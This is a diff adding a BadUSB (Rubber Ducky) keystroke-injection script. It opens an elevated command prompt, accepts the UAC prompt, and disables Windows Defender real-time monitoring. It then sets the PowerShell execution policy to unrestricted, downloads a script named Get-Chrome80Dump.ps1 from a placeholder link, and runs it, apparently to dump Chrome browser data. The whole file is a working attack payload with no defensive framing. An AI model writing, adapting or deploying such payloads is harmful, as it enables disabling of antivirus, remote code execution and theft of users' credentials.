@@ -1,0 +1,25 @@
+REM let the HID enumerate
+DELAY 1000
+GUI r
+DELAY 300
+STRING cmd 
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 3000
+ALT y 
+DELAY 1000
+STRING cd C:\
+ENTER
+DELAY 1500
+STRING powershell
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 3000
+STRING set-executionpolicy unrestricted
+ENTER
+DELAY 2000
+REM  *** Realiza o Download do .ps1 e Executa o .ps1 ***
+STRING (new-object System.Net.WebClient).DownloadFile("LINK DO SEU POWERSHELL NA NUVEM", "$($env:LOCALAPPDATA)\Get-Chrome80Dump.ps1"); powershell "$($env:LOCALAPPDATA)\Get-Chrome80Dump.ps1";
+ENTER
